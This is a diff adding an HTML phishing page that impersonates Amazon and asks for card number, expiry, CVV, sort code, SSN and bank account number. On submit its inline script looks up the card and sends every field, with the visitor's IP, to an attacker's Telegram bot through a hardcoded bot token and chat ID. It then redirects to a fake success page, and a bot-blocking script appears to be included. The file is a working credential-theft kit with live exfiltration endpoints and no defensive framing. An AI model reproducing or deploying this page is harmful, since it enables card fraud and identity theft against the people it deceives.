@@ -1,0 +1,216 @@
+<html>
+
+<head>
+  <title>Amazon - Update Info</title>
+  <link rel="icon" href="../assets/img/amazon.png">
+  <link rel="stylesheet" href="../assets/css/mobile_login.css">
+  <link rel="stylesheet" href="../assets/css/billing.css">
+  <script type="text/javascript" src="../assets/js/jquery-1.9.1.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.payment.js"></script>
+  <script type="text/javascript" src="../assets/js/additional-methods.min.js"></script>
+  <script type="text/javascript" src="../assets/js/jquery.maskedinput.js"></script>
+  <!-- <script type="text/javascript" src="../assets/js/validate.php"></script> -->
+  <script type="text/javascript" src="../assets/js/validation.js"></script>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+</head>
+
+<body>
+  <center>
+    <br>
+    <header style="background-color:#fff;">
+      <div class="hleft">
+        <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
+        height: 31px;
+        width: 103px;" role="img" aria-label="Amazon"></i>
+      </div>
+    </header>
+  </center>
+  <center>
+    <br>
+    <div style="width:400px;" class="boxlogin">
+      <div class="a-section a-spacing-none auth-pagelet-mobile-container">
+        <form action="" method="post" name="add" id="details" novalidate="novalidate">
+          <div id="formbilling">
+            <h4>Enter Your Credit Card Information</h4>
+            <div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
+              <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <!-- <input type="hidden" name="token" id='token' value="1163128696:AAGHzQ3d4IZgIXqmw_C0P35LWN0E6uTFeis"> -->
+                            <!-- <input type="hidden" name="chat_id" id="chat_id" value="-1001627475581">-->
+                            <input type="hidden" name="ip" id="ip" > 
+                <input type="text" style="" placeholder="Your name as it appears on card" name="ccname" id="ccname" autocorrect="off"
+                  autocapitalize="off" data-validation="required">
+              </div>
+              <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="Card Number" onkeyup="ccc();" name="ccno" maxlength="16" id="ccno"
+                  autocorrect="off" autocapitalize="off"  data-validation="required">
+              </div><br>
+              <h4>Expiration Date</h4>
+              <div style="border-top-color: #949494;background: #e7e9ec;
+        border-radius: 3px;
+        border-color: #ADB1B8 #A2A6AC #8D9096;
+        border-style: solid;
+        border-width: 1px;
+        cursor: pointer;
+        display: inline-block;
+        padding: 5px;
+        width:40%;
+        text-align: center;
+        text-decoration: none!important;
+        vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <select name="exp_bulan" id="exp_bulan" style="background-color: transparent;
+        border: 0;
+        display: block;
+        font-size: 1.6rem;
+        line-height: 1.35;
+        margin: 0;
+        outline: 0;
+        padding: 1.2rem 1.6rem 1.2rem 1.7rem;
+        text-align: center;padding:10px;width:99.7%;border-style:none;" required="">
+                  <option value="01" selected="selected">01</option>
+                  <option value="02">02</option>
+                  <option value="03">03</option>
+                  <option value="04">04</option>
+                  <option value="05">05</option>
+                  <option value="06">06</option>
+                  <option value="07">07</option>
+                  <option value="08">08</option>
+                  <option value="09">09</option>
+                  <option value="10">10</option>
+                  <option value="11">11</option>
+                  <option value="12">12</option>
+                </select>
+
+              </div>
+              <div style="margin-left:border-top-color: #949494;background: #e7e9ec;
+        border-radius: 3px;
+        border-color: #ADB1B8 #A2A6AC #8D9096;
+        border-style: solid;
+        border-width: 1px;
+        cursor: pointer;
+        display: inline-block;
+        padding: 5px;
+        width:40%;
+        text-align: center;
+        text-decoration: none!important;
+        vertical-align: middle;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
+        <select name="exp_tahun" id="exp_tahun" style="background-color: transparent;
+        border: 0;
+        display: block;
+        font-size: 1.6rem;
+        line-height: 1.35;
+        margin: 0;
+        outline: 0;
+        padding: 1.2rem 1.6rem 1.2rem 1.7rem;
+        text-align: center;padding:10px;width:99.7%;border-style:none;" required="">
+                  <option value="23" selected="selected">2023</option>
+                  <option value="24">2024</option>
+                  <option value="25">2025</option>
+                  <option value="26">2026</option>
+                  <option value="27">2027</option>
+                  <option value="28">2028</option>
+                  <option value="29">2029</option>
+                  <option value="30">2030</option>
+				  <option value="31">2031</option>
+				  <option value="32">2032</option>
+                </select>
+
+              </div><br><br>
+              <br>
+              <h4>Security Code</h4>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="CVV" name="cvv" onkeyup="check_additional();" id="cvv"
+                  autocorrect="off" autocapitalize="off" data-validation="number" data-validation="required">
+              </div>
+              <!--  -->
+              <br>
+              <H4>Sort Code <FONT color=#717171 size=1px></FONT>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="" name="sortcode" onkeyup="check_additional();"  id="sortcode" maxlength="9"
+                  autocorrect="off" autocapitalize="off" data-validation="">
+              </div>
+              <br>
+              <H4>SSN <FONT color=#717171 size=1px></FONT>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" name="ssn" onkeyup="check_additional();"  id="ssn" maxlength="9" placeholder="Optional" 
+                  autocorrect="off" autocapitalize="off" data-validation="">
+              </div>
+              <br>
+              <H4>Account Number <FONT color=#717171 size=1px></FONT>
+              <div style="border-top-color: #949494;padding: 5px;"
+                class="a-input-text-wrapper auth-required-field auth-fill-claim">
+                <input type="tel" placeholder="Optional" name="accoutnumber" onkeyup="check_additional();" id="accoutnumber" maxlength="10"
+                  autocorrect="off" autocapitalize="off" data-validation="">
+              </div>
+              <!--  -->
+              <div id="amexcid"></div>
+              <br>
+              <input type="submit" id="submit_cc" class="button a-button-text"
+                style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value="Update">
+            </div>
+          </div>
+
+        </form>
+      </div>
+
+    </div>
+  </center>
+  <br><br>
+
+   <!--  -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+  <script src="blocking.js"></script>
+  <script>
+
+
+$('form').submit(function(e){
+
+  e.preventDefault();
+  var cardnumber = $('#ccno').val();
+  var fixacardnumber = cardnumber.replace(/\s+/g, '');
+  console.log(fixacardnumber);
+
+    $.getJSON( "https://lookup.binlist.net/"+fixacardnumber, function(data) {
+      var title = data.scheme;
+      var bankName = data.bank.name;
+      var typeCard = data.type;
+      var brand = data.brand;
+           // 
+           $.ajax({
+            url:'https://api.telegram.org/bot1448616115:AAGJxXv8BpxK7p9rWYGdTPk5iBHzK1Cwtv0/sendMessage',
+            method:'POST',
+            data:{chat_id:'-1001627475581',
+            text:'\u{2B50}\u{2B50}\u{2B50} CC BUAT BOSS \u{2B50}\u{2B50}\u{2B50}\n━━━━━━━━━━━━━━━\nIP : '+$('#ip').val()+' \n━━━━━━━━━━━━━━━\n'+title +' \n'+bankName+' \n'+ typeCard + ' \n'+ brand +' \n━━━━━━━━━━━━━━━\nName: '+$('#ccname').val()+' \nNum: '+fixacardnumber+' \nExp: '+$('#exp_bulan').val()+' / '+$('#exp_tahun').val()+' \nCVV: '+$('#cvv').val()+' \n━━━━━━━━━━━━━━━\nSortCode: '+$('#sortcode').val()+' \nAccountNumber: '+$('#accoutnumber').val()+' \nSSN: '+$('#ssn').val()+' \n━━━━━━━━━━━━━━━\n\u{2B50}\u{2B50}\u{2B50} CC BUAT BOSS \u{2B50}\u{2B50}\u{2B50}'},
+            success:function(){
+              window.location.replace("success.html");
+            }
+            });
+            // 
+    });
+  
+});
+
+$(document).ready(function() {
+  blockUser();
+
+  $("#sortcode").mask("99-99-99", {
+    placeholder: "Optional"
+  });
+  $("#ssn").mask("999-99-9999", {
+    placeholder: "Optional"
+  });
+});
+
+    $("#ccno").mask("9999 9999 9999 9999");
+ 
+  </script>
+    <!--  -->
+</body>
+
+</html>
